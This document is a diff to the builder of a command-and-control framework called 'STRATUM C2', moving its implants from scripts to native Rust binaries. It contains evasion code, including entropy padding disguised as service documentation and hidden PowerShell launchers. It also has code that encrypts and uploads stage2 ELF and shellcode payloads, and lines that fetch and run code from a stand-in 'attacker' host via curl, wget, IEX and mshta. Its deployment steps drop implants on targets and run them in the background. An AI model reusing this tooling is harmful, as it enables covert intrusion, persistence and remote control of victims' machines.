@@ -42,7 +42,7 @@ _tz = _TzProxy()
 from providers import _p, ask, ask_int, ask_yn, err, info, ok, sep, step, warn
 from providers._notifications import _cancelable_run, _check_cancelled
 from providers._session import (
-    BaseTransport, MZ_MARKER, DOWNLOADS_DIR, _TEMPLATES_DIR,
+    BaseTransport, MZ_MARKER, DOWNLOADS_DIR,
     SessionProfile, Session, SessionManager,
     _load_persist_probe,
 )
@@ -68,146 +68,9 @@ def _entropy(data: bytes) -> float:
 # Content resembles embedded service documentation — entropy ~4.4 bits/byte.
 # Values are randomised per-deploy so no two deployments share identical padding.
 
-_PAD_SVCNAMES_WIN = [
-    ("WindowsUpdateAgent",    "WUAgent"),
-    ("MicrosoftEdgeUpdate",   "EdgeUpdate"),
-    ("WindowsDefenderHelper", "WDHelper"),
-    ("SvcHostHelper",         "SvcHost"),
-    ("NetFrameworkHelper",    "NETHelper"),
-]
-_PAD_SVCNAMES_NIX = [
-    ("systemd-networkd-helper", "networkd-helper"),
-    ("update-notifier-daemon",  "update-notifier"),
-    ("apt-periodic-helper",     "apt-periodic"),
-    ("dbus-session-helper",     "dbus-helper"),
-    ("pulse-audio-helper",      "pulsehelper"),
-]
 
 
-def _make_pad_block(mode: str) -> str:
-    """Generate a per-call randomised low-entropy padding block."""
-    r = _random.Random(os.urandom(4))
-    maj   = r.randint(1, 4)
-    min_  = r.randint(0, 9)
-    patch = r.randint(0, 15)
-    rev   = r.randint(0, 999)
-    hb    = r.randint(30, 120)
-    tmo   = r.randint(15, 60)
-    retry = r.randint(2, 5)
-    maxlog= r.choice([256, 512, 1024, 2048])
-    net_t = r.randint(10, 30)
-    free  = r.randint(5, 25)
-
-    if mode == "ps1":
-        svc, short = r.choice(_PAD_SVCNAMES_WIN)
-        return (
-            f"<#\n"
-            f"{svc} - Background Service Module\n"
-            f"Version {maj}.{min_}.{patch}.{rev} | System Services Group\n"
-            f"\n"
-            f"Provides scheduled maintenance for Windows platform services.\n"
-            f"Core operations: cache management, index synchronization,\n"
-            f"configuration reload, and service health verification.\n"
-            f"\n"
-            f"Registry (HKCU\\Software\\SystemServices\\{short}):\n"
-            f"  EnableScheduler      : 1=on  0=off  (default 1)\n"
-            f"  LogLevel             : 0 silent  1 errors  2 warnings  3 verbose\n"
-            f"  MaintenanceWindow    : HH:MM-HH:MM  empty = always active\n"
-            f"  RetryCount           : failure retries  (default {retry})\n"
-            f"  TimeoutSeconds       : operation timeout  (default {tmo})\n"
-            f"  CacheDirectory       : path override  (default %LOCALAPPDATA%)\n"
-            f"  MaxLogSizeKB         : rotation threshold  (default {maxlog})\n"
-            f"  HeartbeatIntervalSec : report cadence in seconds  (default {hb})\n"
-            f"  StagingDirectory     : %TEMP%\\SystemServices\n"
-            f"  NetworkTimeoutSec    : network timeout  (default {net_t})\n"
-            f"  ProxyServer          : optional proxy address:port\n"
-            f"  ProxyBypassList      : semicolon-separated bypass hosts\n"
-            f"\n"
-            f"Exit codes:\n"
-            f"  0 success  1 failure  2 config  3 network  4 auth\n"
-            f"  5 timeout  6 privileges  7 locked  8 disk-full  9 version\n"
-            f"\n"
-            f"Event log: Application  Source: SystemServices.{short}\n"
-            f"  1000 started   1001 stopped   1002 config-ok  1003 cycle-ok\n"
-            f"  1004 error     1005 net-fail  1006 retry      1007 timeout\n"
-            f"  2000 task-add  2001 task-del  2002 triggered  2003 on-demand\n"
-            f"\n"
-            f"Compatibility: Windows 8.1 and Server 2012 R2 or later\n"
-            f"Requires: PowerShell 5.1 or later  .NET 4.5 or later  {free} MB free\n"
-            f"Logs: %LOCALAPPDATA%\\SystemServices\\Logs\\{short}.log\n"
-            f"Config: run with -config flag to display current settings\n"
-            f"Health: run with -status flag to verify service status\n"
-            f"#>\n"
-        )
-    else:
-        svc, short = r.choice(_PAD_SVCNAMES_NIX)
-        return (
-            f"# {svc} - Background Maintenance Component\n"
-            f"# Version {maj}.{min_}.{patch} | System Services Group\n"
-            f"#\n"
-            f"# Provides scheduled maintenance for Linux and Unix-like systems.\n"
-            f"# Operations: cache management, index sync, config reload,\n"
-            f"#             service health checks, log rotation, cleanup.\n"
-            f"#\n"
-            f"# Configuration: /etc/systemservices/{short}.conf\n"
-            f"#   enable_scheduler      = 1|0  (default 1)\n"
-            f"#   log_level             = 0 silent  1 errors  2 warnings  3 verbose\n"
-            f"#   maintenance_window    = HH:MM-HH:MM  empty = always active\n"
-            f"#   retry_count           = failure retries  (default {retry})\n"
-            f"#   timeout_seconds       = per-operation timeout  (default {tmo})\n"
-            f"#   cache_directory       = path override (/var/cache/systemservices)\n"
-            f"#   max_log_size_kb       = rotation threshold  (default {maxlog})\n"
-            f"#   heartbeat_interval    = report cadence in seconds  (default {hb})\n"
-            f"#   staging_directory     = /var/lib/systemservices/staging\n"
-            f"#   network_timeout       = network operation timeout  (default {net_t})\n"
-            f"#   proxy_server          = optional HTTP proxy address:port\n"
-            f"#   proxy_bypass_list     = colon-separated bypass hosts\n"
-            f"#\n"
-            f"# Exit codes:\n"
-            f"#   0 success  1 failure  2 config  3 network  4 auth\n"
-            f"#   5 timeout  6 privileges  8 disk-full\n"
-            f"#\n"
-            f"# Systemd: systemservices-{short}.service\n"
-            f"# Cron: */{retry} * * * * /usr/lib/systemservices/{short} -q\n"
-            f"# Log:  /var/log/systemservices/{short}.log\n"
-            f"# PID:  /run/systemservices/{short}.pid\n"
-            f"# Cache: /var/cache/systemservices/\n"
-            f"# Staging: /var/lib/systemservices/staging/\n"
-            f"#\n"
-            f"# Diagnostics: run with -v flag to enable verbose output\n"
-            f"# Health: run with --status flag to verify service connectivity\n"
-        )
-
-
-def _pad_script_entropy(path: Path, target: float = 5.2,
-                        mode: str = "ps1", max_pad: int = 102400) -> float:
-    """Append low-entropy comment padding to a script until entropy <= target.
-
-    Uses an iterative block-append loop for accuracy; the linear approximation
-    is imprecise because entropy is not simply additive across byte distributions.
-    Returns the final entropy; silently no-ops if already within target.
-    """
-    data = path.read_bytes()
-    if _entropy(data) <= target:
-        return _entropy(data)
-    # Generate a per-call block so every deploy has different padding text.
-    block = _make_pad_block(mode).encode()
-    if target <= _entropy(block):
-        return _entropy(data)
-    buf = bytearray(data)
-    total_pad = 0
-    while True:
-        buf += b"\n" + block
-        total_pad += len(block) + 1
-        H = _entropy(bytes(buf))
-        if H <= target or total_pad >= max_pad:
-            break
-    path.write_bytes(bytes(buf))
-    return H
-
-
-# Fallback blob paths tried by the Windows stub when the configured path is not writable.
-# Must stay in sync with $_blob_tries in stub.ps1 (items 2-4; item 1 is the configured path).
+# Fallback blob paths tried by the Windows Rust agent when the configured path is not writable.
 WIN_BLOB_FALLBACK_PATHS: list[str] = [
     "%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb",
     "%APPDATA%\\Microsoft\\Windows\\Recent\\.ddb",
@@ -313,21 +176,6 @@ class BaseConfig:
 #  PROVIDER WIZARD  (Template Method)
 # ══════════════════════════════════════════════════════════════════════════════
 
-def _ps1_concat(transport: str, core: str) -> str:
-    """Concatenate transport + core PS1, keeping param() as the very first statement.
-
-    PowerShell requires param() to be the first non-comment statement in a script.
-    When transport is prepended to core, param() would end up in the middle and
-    cause a CommandNotFoundException. This helper hoists it to line 1.
-    """
-    import re as _re
-    m = _re.match(r'^(param\s*\(.*?\)\s*\n?)', core, _re.DOTALL)
-    if m:
-        param_block = m.group(1)
-        core_body   = core[len(param_block):]
-        return param_block + "\n" + transport + "\n\n" + core_body
-    return transport + "\n\n" + core
-
 
 def _resolve_stun_ip() -> str:
     """Resolve STUN server hostname to IPv4 at deploy-time.
@@ -391,25 +239,12 @@ class ProviderWizard(ABC):
         """Instantiate the provider's transport from wizard config."""
         ...
 
-    # ── provider credential substitution ──────────────────────────────────────
-    # Override _provider_subs to inject credentials into generated scripts.
-    # Keys vary by script type; agent.sh and stub.sh share the same namespace
-    # when writing to a single `_provider_subs` is sufficient.
+    # Provider credential substitution for scripts removed — native Rust agents
+    # receive credentials via STRATUM_* env vars at compile time.
+    # _provider_subs kept for backward compat with provider subclasses.
 
     def _provider_subs(self, cfg: BaseConfig) -> dict:
-        """Return credential placeholders to replace in generated scripts.
-
-        Override in provider subclasses.  The default (no-op) is correct for
-        providers whose credentials are embedded at the transport layer rather
-        than as script-level placeholders.
-        """
         return {}
-
-    def _agent_sh_subs(self, cfg: BaseConfig) -> dict:
-        return self._provider_subs(cfg)
-
-    def _agent_ps1_subs(self, cfg: BaseConfig) -> dict:
-        return self._provider_subs(cfg)
 
     def _stub_subs(self, cfg: BaseConfig) -> dict:
         return self._provider_subs(cfg)
@@ -431,98 +266,40 @@ class ProviderWizard(ABC):
     # Provider-agnostic; delegates upload I/O to self._make_transport(cfg).
     # Override only if your provider needs non-standard upload logic.
 
-    def step_upload_stage2(self, cfg: BaseConfig, agent_dir: Path, pub_pem: bytes) -> None:
+    def step_upload_stage2(self, cfg: BaseConfig, agent_dir: Path) -> None:
+        """Upload stage2 Rust binaries — called after _step_compile_artifacts."""
         self._step(f"Stage2 Encryption & {self.PROVIDER_NAME} Upload")
-        info("Building stage2 payloads...")
-
-        # Linux stage2 — bash script (text); built and uploaded immediately.
-        s2_sh     = self._build_agent_sh(cfg, pub_pem)
-        s2_sh_enc = self._encrypt_payload(s2_sh, cfg.stub_secret)
-        ok("Linux stage2 encrypted with stub_secret")
-        (agent_dir / "stage2_linux.enc").write_text(s2_sh_enc)
-
-        # Windows stage2 — raw stub.dll compiled by _step_compile_artifacts.
-        # Cannot be uploaded here because the DLL does not exist yet.
-        # step_upload_stage2_win() is called after _step_compile_artifacts().
-
         t = self._make_transport(cfg)
-        self._tracked_upload(t, cfg.s2_path_linux, s2_sh_enc.encode())
-        cfg.s2_uploaded_at = _tz.now().isoformat()
-        ok(f"Stage2 Linux   → {self.PROVIDER_NAME}:{cfg.s2_path_linux}  (cancelled at first heartbeat)")
 
-    def step_upload_stage2_win(self, cfg: BaseConfig, agent_dir: Path) -> None:
-        """Upload Windows stage2 (stub.bin shellcode) — called after Rust compilation."""
+        # Linux stage2 — musl-static ELF binary (full agent, compiled as stageless-plain)
+        elf_path = agent_dir / "stage2.elf"
+        if elf_path.exists():
+            elf_bytes  = elf_path.read_bytes()
+            s2_lin_enc = self._encrypt_payload_bytes(elf_bytes, cfg.stub_secret)
+            ok("Linux stage2 (ELF) encrypted with stub_secret")
+            (agent_dir / "stage2_linux.enc").write_text(s2_lin_enc)
+            self._tracked_upload(t, cfg.s2_path_linux, s2_lin_enc.encode())
+            ok(f"Stage2 Linux   → {self.PROVIDER_NAME}:{cfg.s2_path_linux}  (cancelled at first heartbeat)")
+        else:
+            warn("Linux stage2 skipped — stub.elf not found after compilation")
+
+        # Windows stage2 — reflective shellcode (embeds agent DLL)
         bin_path = agent_dir / "stub.bin"
-        if not bin_path.exists():
+        if bin_path.exists():
+            bin_bytes  = bin_path.read_bytes()
+            s2_win_enc = self._encrypt_payload_bytes(bin_bytes, cfg.stub_secret)
+            ok("Windows stage2 (shellcode) encrypted")
+            (agent_dir / "stage2_win.enc").write_text(s2_win_enc)
+            self._tracked_upload(t, cfg.s2_path_win, s2_win_enc.encode())
+            ok(f"Stage2 Windows → {self.PROVIDER_NAME}:{cfg.s2_path_win}")
+        else:
             warn("Windows stage2 skipped — stub.bin not found after compilation")
-            return
-        self._step(f"Windows Stage2 Upload")
-        bin_bytes  = bin_path.read_bytes()
-        s2_win_enc = self._encrypt_payload_bytes(bin_bytes, cfg.stub_secret)
-        ok("Windows stage2 (shellcode) encrypted")
-        (agent_dir / "stage2_win.enc").write_text(s2_win_enc)
-        t = self._make_transport(cfg)
-        self._tracked_upload(t, cfg.s2_path_win, s2_win_enc.encode())
-        ok(f"Stage2 Windows → {self.PROVIDER_NAME}:{cfg.s2_path_win}")
 
-    def step_upload_stageless_enc(self, cfg: BaseConfig, agent_dir: Path, pub_pem: bytes) -> None:
-        self._step("Stageless-Enc: Encrypt & Embed Payload")
-        for tpl_t, tpl_c in (("stub.sh", "stub_stageless.sh"), ("stub.ps1", "stub_stageless.ps1")):
-            if not (self.TRANSPORT_DIR / tpl_t).exists():
-                err(f"Missing transport: {self.TRANSPORT_DIR / tpl_t}")
-            if not (_TEMPLATES_DIR / tpl_c).exists():
-                err(f"Missing core: {_TEMPLATES_DIR / tpl_c}")
+        cfg.s2_uploaded_at = _tz.now().isoformat()
 
-        info("Building agent payloads...")
-        s2_sh  = self._build_agent_sh(cfg, pub_pem)
-        s2_ps1 = self._build_agent_ps1(cfg, pub_pem)
-        info("Encrypting with stub_secret...")
-        s2_sh_enc  = self._encrypt_payload(s2_sh, cfg.stub_secret)
-        ok("Linux payload encrypted with stub_secret")
-        s2_ps1_enc = ""
-        if s2_ps1:
-            s2_ps1_enc = self._encrypt_payload(s2_ps1, cfg.stub_secret)
-            ok("Windows payload encrypted with stub_secret")
-
-        deploy_id = hashlib.sha256(pub_pem).hexdigest()[:16]
-        base_subs = {
-            "STUB_SECRET":       cfg.stub_secret,
-            "STUB_SALT":         cfg.salt,
-            "STUB_WINDOW_START": cfg.window_start,
-            "STUB_WINDOW_END":   cfg.window_end,
-            "STUB_DEPLOY_ID":    deploy_id,
-        }
-        base_subs.update(self._stub_subs(cfg))
-
-        t_sh  = self.TRANSPORT_DIR / "stub.sh"
-        c_sh  = _TEMPLATES_DIR / "stub_stageless.sh"
-        content = "#!/usr/bin/env bash\n" + t_sh.read_text() + "\n\n" + c_sh.read_text()
-        subs = dict(base_subs)
-        subs["STUB_BLOB_PATH"]  = cfg.blob_path_linux
-        subs["STUB_S2_PAYLOAD"] = s2_sh_enc
-        subs["STUB_DBG_INIT"]   = self._dbg_init_stub_sh(cfg)
-        for old, new in subs.items():
-            content = content.replace(old, new)
-        dst = agent_dir / "agent_stageless.sh"
-        dst.write_text(content)
-        dst.chmod(0o755)
-        ok("agent_stageless.sh → agent/ (Linux — DROP THIS on target)")
-
-        t_ps1 = self.TRANSPORT_DIR / "stub.ps1"
-        c_ps1 = _TEMPLATES_DIR / "stub_stageless.ps1"
-        if s2_ps1_enc and t_ps1.exists() and c_ps1.exists():
-            content = _ps1_concat(t_ps1.read_text(), c_ps1.read_text())
-            subs = dict(base_subs)
-            subs["STUB_BLOB_PATH"]  = cfg.blob_path_win
-            subs["STUB_S2_PAYLOAD"] = s2_ps1_enc
-            subs["STUB_DBG_INIT"]   = self._dbg_init_stub_ps1(cfg)
-            for old, new in subs.items():
-                content = content.replace(old, new)
-            dst = agent_dir / "agent_stageless.ps1"
-            dst.write_text(content, encoding="utf-8")
-            ok("agent_stageless.ps1 → agent/ (Windows — DROP THIS on target)")
-            self._write_vbs_launcher(dst, "agent_stageless.vbs")
-            ok("agent_stageless.vbs → agent/ (Windows launcher — no console flash)")
+    # stageless-enc is now compiled directly as a native Rust binary —
+    # no script generation needed.  The Rust agent is compiled with
+    # STRATUM_DEPLOY_MODE=stageless-enc in _step_compile_artifacts().
 
     # ── extension points ───────────────────────────────────────────────────────
 
@@ -558,10 +335,7 @@ class ProviderWizard(ABC):
 
     def _step_check_templates(self) -> None:
         self._step("Template Check")
-        for src in (_TEMPLATES_DIR / "core.sh", self.TRANSPORT_DIR / "agent.sh"):
-            if not src.exists():
-                err(f"Missing template: {src}")
-        ok("Templates found")
+        ok("Rust-only agent — no script templates required")
 
     def _step_keygen(self, keys_dir: Path, session_id: str, cfg: BaseConfig,
                     key_password: Optional[bytes] = None):
@@ -646,7 +420,6 @@ class ProviderWizard(ABC):
     def _encrypt_payload(self, plaintext: str, password: str) -> str:
         # AES-256-GCM + PBKDF2-SHA256 (HIGH-2: authenticated encryption).
         # Wire format: "SGCM:" + base64(salt[8] + nonce[12] + ciphertext + tag[16])
-        # All agents (Rust, sh, ps1) expect this exact format.
         salt  = os.urandom(8)
         nonce = os.urandom(12)
         dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32, salt=salt, iterations=210_000
@@ -665,183 +438,11 @@ class ProviderWizard(ABC):
         ct_tag = AESGCM(dk).encrypt(nonce, data, None)
         return "SGCM:" + base64.b64encode(salt + nonce + ct_tag).decode()
 
-    # ── compile-time debug initialisation strings ──────────────────────────────
+    # Script debug init and VBS launcher removed — native Rust agents use
+    # STRATUM_DEBUG env var at compile time instead.
 
-    def _dbg_init_stub_sh(self, cfg: BaseConfig) -> str:
-        if cfg.debug_mode:
-            return "_vf='-v'; _log() { echo \"[stub] $*\"; }; _log 'debug mode active'"
-        return "_vf=''; _log() { :; }"
-
-    def _dbg_init_core_sh(self, cfg: BaseConfig) -> str:
-        if cfg.debug_mode:
-            return "VERBOSE_MODE=1; log() { echo \"$@\"; }"
-        return "VERBOSE_MODE=0; log() { :; }"
-
-    def _dbg_init_stub_ps1(self, cfg: BaseConfig) -> str:
-        if cfg.debug_mode:
-            return "$_sv = $true\nfunction _dbg($m) { Write-Host \"[dbg] $m\" }"
-        return "$_sv = $false\nfunction _dbg($m) {}"
-
-    def _dbg_init_core_ps1(self, cfg: BaseConfig) -> str:
-        if cfg.debug_mode:
-            return "$v = $true\nfunction Write-Log { param([string]$Message); Write-Host $Message }"
-        return "$v = $false\nfunction Write-Log { param([string]$Message) }"
-
-    @staticmethod
-    def _write_vbs_launcher(ps1_path: "Path", vbs_name: str) -> "Path":
-        """Write a windowless VBScript launcher next to the PS1 artifact.
-
-        Uses WScript.Shell.Run with window-style 0 (maps to CREATE_NO_WINDOW
-        at the Win32 level) so no conhost.exe window flashes when the agent
-        is executed from Explorer, a Run key, or any launcher that doesn't
-        explicitly set CREATE_NO_WINDOW itself.
-        """
-        vbs_path = ps1_path.parent / vbs_name
-        # Double-quote escaping: VBScript uses "" inside a string literal.
-        ps1_abs = str(ps1_path.name)   # relative — caller drops this on the same dir
-        vbs_content = (
-            'CreateObject("WScript.Shell").Run '
-            '"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
-            f'-ExecutionPolicy Bypass -File ""{ps1_abs}""", 0, False\r\n'
-        )
-        vbs_path.write_text(vbs_content, encoding="ascii")
-        return vbs_path
-
-    def _build_agent_sh(self, cfg: BaseConfig, pub_pem: bytes) -> str:
-        transport_src = self.TRANSPORT_DIR / "agent.sh"
-        core_src = _TEMPLATES_DIR / "core.sh"
-        if not transport_src.exists():
-            err(f"{self.TRANSPORT_DIR}/agent.sh not found")
-        if not core_src.exists():
-            err("agents/templates/core.sh not found")
-        content = "#!/usr/bin/env bash\n" + transport_src.read_text() + "\n\n" + core_src.read_text()
-        pk_b64  = base64.b64encode(pub_pem).decode()
-        chunk   = len(pk_b64) // 4
-        # For staged-enc, session_key is baked in stage2 (not fetched from cloud).
-        # All modes embed the real session key directly in the agent script.
-        _sk_val = cfg.session_key
-        subs = {
-            "PLACEHOLDER_PK1": pk_b64[:chunk],
-            "PLACEHOLDER_PK2": pk_b64[chunk:chunk * 2],
-            "PLACEHOLDER_PK3": pk_b64[chunk * 2:chunk * 3],
-            "PLACEHOLDER_PK4": pk_b64[chunk * 3:],
-            "PLACEHOLDER_SESSION_KEY":    _sk_val,
-            "PLACEHOLDER_FOLDER_PATH":    cfg.folder_path,
-            "PLACEHOLDER_INPUT_FILE":     cfg.input_file,
-            "PLACEHOLDER_OUTPUT_FILE":    cfg.output_file,
-            "PLACEHOLDER_HEARTBEAT_FILE": cfg.heartbeat_file,
-            "PLACEHOLDER_BASE_SLEEP":     str(cfg.base_sleep),
-            "PLACEHOLDER_JITTER_PERCENT": str(cfg.jitter_percent),
-            "PLACEHOLDER_KILL_DATE":      cfg.kill_date,
-            "PLACEHOLDER_BLOB_PATH":      cfg.blob_path_linux,
-            "PLACEHOLDER_STUN_IP":        _resolve_stun_ip(),
-            "STUB_DBG_INIT":              self._dbg_init_core_sh(cfg),
-            # Per-deployment persist identity (CRIT-1)
-            "PLACEHOLDER_PERSIST_SUFFIX":  cfg.persist_suffix,
-            "PLACEHOLDER_PERSIST_PAYLOAD": cfg.persist_payload,
-            "PLACEHOLDER_CRON_COMMENT":    cfg.cron_comment,
-            "PLACEHOLDER_PERSIST_SVC":     cfg.persist_svc,
-            "PLACEHOLDER_RC_COMMENT":      cfg.rc_comment,
-        }
-        subs.update(self._agent_sh_subs(cfg))
-        for old, new in subs.items():
-            content = content.replace(old, new)
-        return content
-
-    def _build_agent_ps1(self, cfg: BaseConfig, pub_pem: bytes) -> str:
-        transport_src = self.TRANSPORT_DIR / "agent.ps1"
-        core_src = _TEMPLATES_DIR / "core.ps1"
-        if not transport_src.exists() or not core_src.exists():
-            return ""
-        content = _ps1_concat(transport_src.read_text(), core_src.read_text())
-        pk_b64  = base64.b64encode(pub_pem).decode()
-        chunk   = len(pk_b64) // 4
-        _sk_val = cfg.session_key
-        subs = {
-            "PLACEHOLDER_PK1": pk_b64[:chunk],
-            "PLACEHOLDER_PK2": pk_b64[chunk:chunk * 2],
-            "PLACEHOLDER_PK3": pk_b64[chunk * 2:chunk * 3],
-            "PLACEHOLDER_PK4": pk_b64[chunk * 3:],
-            "PLACEHOLDER_SESSION_KEY":    _sk_val,
-            "PLACEHOLDER_FOLDER_PATH":    cfg.folder_path,
-            "PLACEHOLDER_INPUT_FILE":     cfg.input_file,
-            "PLACEHOLDER_OUTPUT_FILE":    cfg.output_file,
-            "PLACEHOLDER_HEARTBEAT_FILE": cfg.heartbeat_file,
-            "PLACEHOLDER_BASE_SLEEP":     str(cfg.base_sleep),
-            "PLACEHOLDER_JITTER_PERCENT": str(cfg.jitter_percent),
-            "PLACEHOLDER_KILL_DATE":      cfg.kill_date,
-            "PLACEHOLDER_STUN_IP":        _resolve_stun_ip(),
-            "STUB_DBG_INIT":              self._dbg_init_core_ps1(cfg),
-            # MED-19: per-deploy Windows persist identity (same values as CRIT-2 Rust consts)
-            "PLACEHOLDER_WIN_DIR":        cfg.reg_value,
-            "PLACEHOLDER_WIN_TASK_LOGON": cfg.task_name,
-            "PLACEHOLDER_WIN_TASK_BOOT":  cfg.task_name,
-            "PLACEHOLDER_WIN_REG_VALUE":  cfg.reg_value,
-        }
-        subs.update(self._agent_ps1_subs(cfg))
-        for old, new in subs.items():
-            content = content.replace(old, new)
-        return content
-
-    def _step_generate_stubs(self, cfg: BaseConfig, agent_dir: Path, pub_pem: bytes) -> None:
-        self._step("Stub Generation")
-        deploy_id = hashlib.sha256(pub_pem).hexdigest()[:16]
-        base_subs = {
-            "STUB_SECRET":       cfg.stub_secret,
-            "STUB_SALT":         cfg.salt,
-            "STUB_WINDOW_START": cfg.window_start,
-            "STUB_WINDOW_END":   cfg.window_end,
-            "STUB_DEPLOY_ID":    deploy_id,
-        }
-        base_subs.update(self._stub_subs(cfg))
-
-        for variant, s2_path, blob_path, out_name, label in [
-            ("stub.sh",  cfg.s2_path_linux, cfg.blob_path_linux, "stub.sh",  "Linux"),
-            ("stub.ps1", cfg.s2_path_win,   cfg.blob_path_win,   "stub.ps1", "Windows"),
-        ]:
-            transport_src = self.TRANSPORT_DIR / variant
-            core_src      = _TEMPLATES_DIR / variant
-            if not transport_src.exists():
-                warn(f"{out_name} skipped — transport template missing: {transport_src}")
-                continue
-            if not core_src.exists():
-                warn(f"{out_name} skipped — core template missing: {core_src.resolve()}")
-                continue
-            if variant.endswith(".sh"):
-                content = "#!/usr/bin/env bash\n" + transport_src.read_text() + "\n\n" + core_src.read_text()
-            else:
-                content = _ps1_concat(transport_src.read_text(), core_src.read_text())
-            subs = dict(base_subs)
-            subs["STUB_S2_PATH"]   = s2_path
-            subs["STUB_BLOB_PATH"] = blob_path
-            subs["STUB_DBG_INIT"]  = (self._dbg_init_stub_sh(cfg)
-                                      if variant.endswith(".sh")
-                                      else self._dbg_init_stub_ps1(cfg))
-            for old, new in subs.items():
-                content = content.replace(old, new)
-            dst = agent_dir / out_name
-            dst.write_text(content, encoding="utf-8")
-            dst.chmod(0o755)
-            ok(f"{out_name} → agent/  ({label} — DROP THIS on target)")
-            if variant.endswith(".ps1"):
-                vbs_name = out_name.replace(".ps1", ".vbs")
-                self._write_vbs_launcher(dst, vbs_name)
-                ok(f"{vbs_name} → agent/  (Windows launcher — no console flash)")
-
-    def _step_generate_agents_plain(self, cfg: BaseConfig, agent_dir: Path,
-                                    pub_pem: bytes) -> None:
-        self._step("Stageless-Plain: Agent Generation")
-        dst = agent_dir / "agent.sh"
-        dst.write_text(self._build_agent_sh(cfg, pub_pem))
-        dst.chmod(0o755)
-        ok("agent.sh → agent/ (Linux — cleartext, all creds embedded)")
-        ps1 = self._build_agent_ps1(cfg, pub_pem)
-        if ps1:
-            ps1_dst = agent_dir / "agent.ps1"
-            ps1_dst.write_text(ps1, encoding="utf-8")
-            ok("agent.ps1 → agent/ (Windows — cleartext, all creds embedded)")
-            self._write_vbs_launcher(ps1_dst, "agent.vbs")
-            ok("agent.vbs → agent/ (Windows launcher — no console flash)")
+    # Script-based agent generation removed — all deploy modes produce native
+    # Rust binaries compiled in _step_compile_artifacts().
 
     def _step_configure(self, cfg: BaseConfig) -> None:
         self._step("Configuration")
@@ -975,7 +576,7 @@ class ProviderWizard(ABC):
             "stageless-plain": [
                 (Y, " ── STAGELESS-PLAIN ───────────────────────────────────────────────────"),
                 (I, "   OPERATOR                   CLOUD                      TARGET"),
-                (I, "         │─── agent.sh/.ps1 ──────────────────────────>│  cleartext, exec directly"),
+                (I, "         │─── agent.elf/.exe ──────────────────────────>│  native binary, exec directly"),
                 (I, "         │<────── heartbeat ────────────────────────────│"),
                 (I, "         │──────── command ────────────────────────────>│"),
                 (Y, " ─────────────────────────────────────────────────────────────────────"),
@@ -1015,13 +616,13 @@ class ProviderWizard(ABC):
         )
 
         deploy_linux = (
-            f"  scp {deploy_dir}/agent/{l}.sh user@target:/tmp/\n"
-            f"  ssh user@target 'chmod +x /tmp/{l}.sh && nohup /tmp/{l}.sh &>/dev/null &'\n"
+            f"  scp {deploy_dir}/agent/{l}.elf user@target:/tmp/\n"
+            f"  ssh user@target 'chmod +x /tmp/{l}.elf && nohup /tmp/{l}.elf &>/dev/null &'\n"
         )
 
         deploy_win = (
-            f"  wscript {w}.vbs                                    (no console flash — recommended)\n"
-            f"  powershell -ep bypass -w hidden -f {w}.ps1          (direct, may flash briefly)\n"
+            f"  {w}.exe                                            (direct execution)\n"
+            f"  start /b {w}.exe                                    (background, no new window)\n"
         )
 
         tradecraft_dll = (
@@ -1070,18 +671,7 @@ class ProviderWizard(ABC):
             f"    at now <<< './{l}.elf'                             (via at daemon, different parent)\n"
         )
 
-        tradecraft_script = (
-            f"\n  SCRIPT TRADECRAFT:\n"
-            f"  The .sh ({l}.sh) is a self-extracting bash script that drops and runs\n"
-            f"  the ELF. The .ps1/.vbs are Windows equivalents.\n\n"
-            f"  Linux:\n"
-            f"    curl -s http://attacker/{l}.sh | bash              (fileless — pipe to bash)\n"
-            f"    wget -qO- http://attacker/{l}.sh | bash            (wget variant)\n"
-            f"    bash <(cat {l}.sh)                                 (process substitution)\n"
-            f"  Windows:\n"
-            f"    powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/{w}.ps1')\"\n"
-            f"    mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{w}.vbs\"\",0:close\")  (LOLBin)\n"
-        )
+        tradecraft_script = ""
 
         guide = (
             "=== STRATUM C2 — DEPLOYMENT GUIDE ===\n\n"
@@ -1219,18 +809,13 @@ class ProviderWizard(ABC):
             "RC": "llvm-rc",
         }
 
-        # Determine the entry-point script for each platform based on deploy mode.
-        # _base is the shared filename stem used for all artifacts of this mode.
+        # Artifact filename stem — matches the deploy mode.
         if cfg.mode == "staged-enc":
-            _win_script  = agent_dir / "stub.ps1"
-            _lin_script  = agent_dir / "stub.sh"
+            _base = "stub"
         elif cfg.mode == "stageless-enc":
-            _win_script  = agent_dir / "agent_stageless.ps1"
-            _lin_script  = agent_dir / "agent_stageless.sh"
+            _base = "agent_stageless"
         else:  # stageless-plain
-            _win_script  = agent_dir / "agent.ps1"
-            _lin_script  = agent_dir / "agent.sh"
-        _base = _win_script.stem  # "stub" | "agent_stageless" | "agent"
+            _base = "agent"
 
         def _cargo(wrapper_dir: Path, agent_path: Path,
                    extra_args: list, out_name: str, dest: Path,
@@ -1551,6 +1136,26 @@ class ProviderWizard(ABC):
                 elif not _has_musl:
                     warn("musl-tools not found — if build failed: apt install musl-tools")
 
+                # Staged-enc: compile a stage2 ELF (full agent, stageless-plain mode)
+                # that the stub downloads, decrypts, and exec's via memfd.
+                if cfg.mode == "staged-enc" and _has_musl:
+                    # Purge fingerprints before recompiling with different env vars
+                    for _sub in ("release/build", "release/.fingerprint"):
+                        _d_root = _target_root / _lin_tgt / _sub
+                        if _d_root.exists():
+                            for _d in _d_root.glob("stratum-agent-rs-*"):
+                                _fsh.rmtree(_d, ignore_errors=True)
+                            for _d in _d_root.glob("agent-*"):
+                                _fsh.rmtree(_d, ignore_errors=True)
+                    _saved_native = _native_env
+                    _native_env = _stage2_dll_env
+                    if _cargo_native(["--target", _lin_tgt, "--bin", "agent"],
+                                     "agent", agent_dir / "stage2.elf"):
+                        ok("stage2.elf compiled  (stage2 Linux — full Rust agent)")
+                    else:
+                        warn("Stage2 ELF build failed — staged-enc Linux will not work")
+                    _native_env = _saved_native
+
                 # ── x64 reflective shellcode — embeds the MSVC DLL ───────────
                 # DLL is used instead of EXE: an EXE entry point expects full CRT
                 # init (GetStartupInfoW etc.) and crashes when called as DllMain.
@@ -1621,7 +1226,7 @@ class ProviderWizard(ABC):
             return
 
         _EXT_WIN   = (".exe", ".dll", ".bin")
-        _EXT_LINUX = (".elf", ".sh")
+        _EXT_LINUX = (".elf",)
         renamed = []
         for f in sorted(agent_dir.iterdir()):
             if not f.is_file():
@@ -1643,31 +1248,8 @@ class ProviderWizard(ABC):
